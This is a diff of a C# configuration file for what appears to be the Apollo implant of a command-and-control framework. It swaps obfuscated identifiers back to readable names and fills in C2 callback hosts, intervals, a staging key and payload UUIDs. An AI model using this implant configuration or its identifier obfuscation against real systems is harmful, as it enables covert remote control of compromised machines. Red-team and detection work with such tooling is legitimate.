@@ -1,12 +1,12 @@
 ﻿#define C2PROFILE_NAME_UPPER
 
-
+//#define LOCAL_BUILD
 
 #if LOCAL_BUILD
-
-
-
-
+//#define HTTP
+//#define WEBSOCKET
+//#define TCP
+//#define SMB
 #endif
 
 #if HTTP
@@ -16,9 +16,9 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using PhantomInterop.Structs.PhantomStructs;
+using ApolloInterop.Structs.ApolloStructs;
 using PSKCryptography;
-using PhantomInterop.Serializers;
+using ApolloInterop.Serializers;
 #if WEBSOCKET
 using WebsocketTransport;
 #endif
@@ -28,9 +28,9 @@ using NamedPipeTransport;
 #if TCP
 using TcpTransport;
 #endif
-namespace Phantom
+namespace Apollo
 {
-    public static class E8h9i0j1
+    public static class Config
     {
         public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
         {
@@ -46,7 +46,7 @@ namespace Phantom
                         { "callback_interval", "1" },
                         { "callback_jitter", "0" },
                         { "callback_port", "80" },
-                        { "callback_host", "http:
+                        { "callback_host", "http://192.168.53.1" },
                         { "post_uri", "data" },
                         { "encrypted_exchange_check", "T" },
                         { "proxy_host", "" },
@@ -55,7 +55,7 @@ namespace Phantom
                         { "proxy_pass", "" },
                         { "domain_front", "domain_front" },
                         { "killdate", "-1" },
-                        { "USER_AGENT", "Phantom-Refactor" },
+                        { "USER_AGENT", "Apollo-Refactor" },
 #else
                         { "callback_interval", "http_callback_interval_here" },
                         { "callback_jitter", "http_callback_jitter_here" },
@@ -87,12 +87,12 @@ namespace Phantom
                         { "callback_interval", "5" },
                         { "callback_jitter", "0" },
                         { "callback_port", "8081" },
-                        { "callback_host", "ws:
+                        { "callback_host", "ws://mythic" },
                         { "ENDPOINT_REPLACE", "socket" },
                         { "encrypted_exchange_check", "T" },
                         { "domain_front", "domain_front" },
                         { "killdate", "-1" },
-                        { "USER_AGENT", "Phantom-Refactor" },
+                        { "USER_AGENT", "Apollo-Refactor" },
 #else
                         { "tasking_type", "websocket_tasking_type_here"},
                         { "callback_interval", "websocket_callback_interval_here" },
@@ -162,18 +162,18 @@ namespace Phantom
         public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
 #endif
 #if HTTP
-        public static string F9i0j1k2 = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
+        public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
 #elif WEBSOCKET
-        public static string F9i0j1k2 = "7546e204-aae4-42df-b28a-ade1c13594d2";
+        public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
 #elif SMB
-        public static string F9i0j1k2 = "aff94490-1e23-4373-978b-263d9c0a47b3";
+        public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
 #elif TCP
-        public static string F9i0j1k2 = "bfc167ea-9142-4da3-b807-c57ae054c544";
+        public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
 #endif
 #else
-        
+        // TODO: Make the AES key a config option specific to each profile
         public static string StagingRSAPrivateKey = "AESPSK_here";
-        public static string F9i0j1k2 = "payload_uuid_here";
+        public static string PayloadUUID = "payload_uuid_here";
 #endif
     }
 }
